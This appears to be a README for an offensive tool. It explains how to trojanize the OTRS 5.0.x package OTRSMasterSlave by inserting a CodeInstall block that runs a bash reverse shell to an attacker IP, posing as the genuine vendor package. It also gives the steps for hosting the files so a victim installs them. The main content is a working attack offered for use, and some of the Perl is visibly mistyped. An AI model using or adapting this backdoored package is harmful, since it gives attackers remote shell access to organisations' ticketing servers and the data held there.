# OTRS-OPM-Reverse-Shell-Package-5.0.X
OTRS OPM Reverse Shell opm Package 5.0.X - installation steps explanation



# OTRS OPM Reverse Shell steps
#Should work with OTRS 5.0.2 software
#Follow the below steps to take a reverse shell on the victim when opm package needs to be installed using otrs.xml file.
Include otrs.xml and .opm files in the same folder.

*****************************************************************************************************************************
     <Package>
        <Name>OTRSMasterSlave</Name>
        <Version>5.0.1</Version>
        <Vendor>OTRS AG</Vendor>
        <URL>http://otrs.org/</URL>
        <License>GNU AFFERO GENERAL PUBLIC LICENSE Version 3, November 2007</License>
        <ChangeLog Date="2015-10-15 05:51:53" Version="5.0.1">Build for OTRSMasterSlave 5.</ChangeLog>
        <ChangeLog Date="2015-08-27 05:58:03" Version="4.0.91">Build for OTRSMasterSlave 5 beta1.</ChangeLog>
        <Description Lang="en">Includes "Ticket Master/Slave" feature.</Description>
        <Description Lang="de">Enthält "Ticket Master/Slave" Funktionalität.</Description>
        <Framework>5.0.x</Framework>
        <Filelist><FileDoc Location="doc/en/OTRSMasterSlave.pdf" Permission="644"/></Filelist>
        <File>OTRSMasterSlave-5.0.1.opm</File>
    </Package>
*****************************************************************************************************************************

1. The above lines of code must be included in the otrs.xml file. These indicate the presence of the OTRSMasterSlave-5.0.1.opm package in the same directory where the otrs.xml is located.

2. OTRSMasterSlave-5.0.1.opm is edited and a reverse shell code is included. The below code is added after the 
	<Framework>5.0.x</Framework>  header.

******************************************************************************************************************************
    <IntroInstall Lang="en" Title="My Module" type="pre">
                &lt;br&gt;
                Hello wolrd
                &lt;br&gt;
                ((Hello!))
                &lt;br&gt
        </IntroInstall>
        <CodeInstall type="pre">
                print qx(bash -i >& /dev/tcp/attackerIP/443 0>&1 &);
        </CodeInstall>
        <CodeInstall Type="post">
                # create the package name
                my $CodeModule = 'var::packagesetup::' . $Param{Structure}-&gt;{Name}-&gt;{Content};
                $Kernel::OM-&gt;Get($ModeModule)-%gt;CodeInstall();
        </CodeInstall>
        <CodeUninstall type="pre">
                my $CodeModule = 'var::packagesetup::' . $Param{Structure}-%gt;{Name}-%gt;{Content};
                $Kernel::OM-&gt;Get($CodeModule)-&gt;CodeUninstall();
        </CodeUninstall>
*******************************************************************************************************************************

3. Give 777 permission to both opm and xml file and run a python server on port 80(on attacker's box).

4. The original opm file was downloaded from https://ftp.otrs.org/pub/otrs/packages/OTRSMasterSlave-5.0.1.opm


